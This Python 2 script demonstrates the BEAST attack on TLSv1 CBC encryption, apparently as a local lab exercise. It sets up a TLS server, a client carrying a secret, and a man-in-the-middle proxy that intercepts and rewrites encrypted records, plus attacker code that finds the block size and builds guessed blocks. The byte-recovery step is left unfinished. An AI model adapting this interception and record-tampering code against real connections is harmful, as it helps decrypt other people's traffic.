#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import binascii
import random
import re
import select
import socket
import SocketServer
import ssl
import string
import sys
import struct
import threading
import time
from utils.color import draw
from pprint import pprint
from struct import *
from itertools import cycle, izip

class SecureTCPHandler(SocketServer.BaseRequestHandler):
  def handle(self):
    self.request = ssl.wrap_socket(self.request, keyfile="cert/localhost.pem", certfile="cert/localhost.pem", server_side=True, ssl_version=ssl.PROTOCOL_TLSv1)
    #loop to avoid broken pipe
    while True:
        try:
            data = self.request.recv(1024)
            if data == '':
                break
            print map(''.join, zip(*[iter(data)]*16))
            self.request.send(b'OK')
        except ssl.SSLError as e:
            pass
    return

class Server:
    """The secure server.
    A sample server, serving on his host and port waiting the client 
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connection(self):
        SocketServer.TCPServer.allow_reuse_address = True
        self.httpd = SocketServer.TCPServer((self.host, self.port), SecureTCPHandler)
        server = threading.Thread(target=self.httpd.serve_forever)
        server.daemon=True
        server.start()
        print('Server is serving HTTPS on {!r} port {}'.format(self.host, self.port))
        return

    def get_host(self):
        return self.host

    def get_port(self):
        return self.port

    def disconnect(self):
        print('Server stop serving HTTPS on {!r} port {}'.format(self.host, self.port))
        self.httpd.shutdown()
        return

class Client:
    """ The unsecure post of the client can be a "unsecure" browser for example.
    The client generate a random cookie and send it to the server through the proxy
    The attacker by injecting javascript code can control the sending request of the client to the proxy -> server
    """

    def __init__(self, host, port):
        self.proxy_host = host
        self.proxy_port = port
        self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
        print draw("Sending request : ", bold=True, fg_yellow=True)
        print draw("the secret is " + "Gyabscdefghicas" + "\n\n",  bold=True, fg_yellow=True)

    def connection(self):
        # Initialization of the client
        ssl_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ssl_sock = ssl.wrap_socket(ssl_sock, server_side=False, ssl_version=ssl.PROTOCOL_TLSv1)
        ssl_sock.connect((self.proxy_host,self.proxy_port))
        ssl_sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.socket = ssl_sock
        return
    
    def request(self, path=0, data=0):
        srt_path = ''
        for x in range(0,path):
            srt_path += 'A'
        try:
            self.socket.sendall(b"the secret is " + srt_path + "Gyabscdefghicas")
            msg = "".join([str(i) for i in self.socket.recv(1024).split(b"\r\n")])
        except ssl.SSLError as e:
            pass
        pass
        return

    def disconnect(self):
        self.socket.close()
        return

class ProxyTCPHandler(SocketServer.BaseRequestHandler):
    """ 
    Start a connection to the secure server and handle multiple socket connections between the client and the server
    Informe the attacker about the client's frames or the server's response
    Finally redirect the data from the client to the server and inversely
    """
    def handle(self):

        # Connection to the secure server
        socket_server = socket.create_connection((server.get_host(), server.get_port()))
        # input allow us to monitor the socket of the client and the server
        inputs = [socket_server, self.request]
        running = True
        data_altered = False
        length_header = 24
        while running:
            readable = select.select(inputs, [], [])[0]
            for source in readable:
                if source is socket_server:

                    data = socket_server.recv(1024)
                    if len(data) == 0:
                        running = False
                        break

                    if data_altered is True:
                        (content_type, version, length) = struct.unpack('>BHH', data[0:5])
                        #if content_type == 23:
                            #exploit.set_decipherable(True)
                        #data_altered = False
                    # we send data to the client
                    self.request.send(data)

                elif source is self.request:
                    
                    ssl_header = self.request.recv(5)
                    if ssl_header == '':
                        running = False
                        break

                    (content_type, version, length) = struct.unpack('>BHH', ssl_header)

                    data = self.request.recv(length)
                    if len(data) == 0:
                        running = False

                    if length == 32:
                        length_header = 32

                    if content_type == 23 and length > length_header:
                        exploit.set_length_frame(data)
                        data = exploit.alter() 
                        check = binascii.hexlify(data)
                        print map(''.join, zip(*[iter(check)]*16))
                        #data_altered = True  
                    
                    # we send data to the server
                    socket_server.send(ssl_header+data)
        return

class Proxy:
    """ Assimilate to a MitmProxy
    start a serving on his host and port and redirect the data to the server due to this handler
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port

    def connection(self):
        SocketServer.TCPServer.allow_reuse_address = True
        httpd = SocketServer.TCPServer((self.host, self.port), ProxyTCPHandler)
        proxy = threading.Thread(target=httpd.serve_forever)
        proxy.daemon=True
        proxy.start()
        print('Proxy is launched on {!r} port {}'.format(self.host, self.port))
        self.proxy = httpd
        return

    def disconnect(self):
        print('Proxy is stopped on {!r} port {}'.format(self.host, self.port))
        self.proxy.shutdown()
        return

class BEAST(Client):
    """ Assimilate to the attacker
    detect the length of a CBC block
    alter the ethernet frame of the client to decipher a byte regarding the proxy informations
    """

    def __init__(self, client):
        self.client = client
        self.length_block = 0
        self.start_exploit = False
        self.start_alter = False
        self.decipherable = False
        self.request = ''
        self.byte_decipher = 0
        self.length_frame = 0
        self.block_decipher = 0

    def run(self):
        print "Start decrypting the request..."
        self.client_connection()

        self.size_of_block()

        add_byte = self.nb_byte_add()

        self.start_exploit = True
        self.send_request_from_the_client(add_byte)

        self.start_exploit = False
        self.start_alter = True
        self.send_request_from_the_client(add_byte)

        print ''
        self.client_disconect()
        return

    def xor(self, a,b):
        result = int(a, 16) ^ int(b, 16) # convert to integers and xor them
        return '{:x}'.format(result)  

    def construct_first_block(self):
        message = self.vector_init
        key     = self.previous_cipher
        guess   = self.create_guess()
        cyphered = ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))
        cyphered2 = ''.join(chr(ord(c)^ord(k)) for c,k in izip(cyphered, cycle(guess)))

        return cyphered2

    def create_guess(self, char=71):
        length_path = self.length_block - self.block_decipher - 1
        return 'A' * length_path + ''.join(['%c' % char])

    def nb_byte_add(self):
        return (self.length_block - len("the secret is ")) + (self.length_block - self.block_decipher - 1)

    def choosing_block(self, current_block):
        #in function of the path added in the request ~ we know the structure of the request
        return self.frame[current_block * self.length_block:(current_block + 1) * self.length_block]

    def find_plaintext_byte(self, frame, byte):
        #return the byte found
        return

    def size_of_block(self):
        print "Begins searching the size of a block...\n"
        self.send_request_from_the_client()
        reference_length = self.length_frame
        i = 0
        while True:
            self.send_request_from_the_client(i)
            current_length = self.length_frame
            self.length_block = current_length - reference_length
            if self.length_block != 0:
                self.nb_prefix = i
                print draw("CBC block size " + str(self.length_block) + "\n", bold=True)
                break
            i += 1
        self.decipherable = False

    def alter(self):
        if self.start_exploit is True:
            self.frame = bytearray(self.frame)
            self.vector_init = str(self.frame[-self.length_block:])
            self.previous_cipher = str(self.frame[:self.length_block])
            return str(self.frame)
        elif self.start_alter is True:
            self.frame = bytearray(self.frame)
            block = self.construct_first_block()
            for i in range(0,16):
                self.frame[i] = block[i]
            return str(self.frame)
        return self.frame

    def set_decipherable(self, status):
        self.decipherable = status
        return

    def set_length_frame(self, data):
        self.frame = data
        self.length_frame = len(data)

    def client_connection(self):
        self.client.connection()
        return

    def send_request_from_the_client(self, path=0, data=0):
        self.client.request(path,data)
        return

    def client_disconect(self):
        self.client.disconnect()
        return

if __name__ == '__main__':                           

    parser = argparse.ArgumentParser(description='Connection with SSLv3')
    parser.add_argument('host', help='hostname or IP address')
    parser.add_argument('port', type=int, help='TCP port number')
    parser.add_argument('-v', help='debug mode', action="store_true")
    args = parser.parse_args()

    server   = Server(args.host, args.port)
    client   = Client(args.host, args.port+1)
    spy      = Proxy(args.host, args.port+1)
    exploit  = BEAST(client)

    server.connection()
    spy.connection()

    exploit.run()

    spy.disconnect()
    server.disconnect()
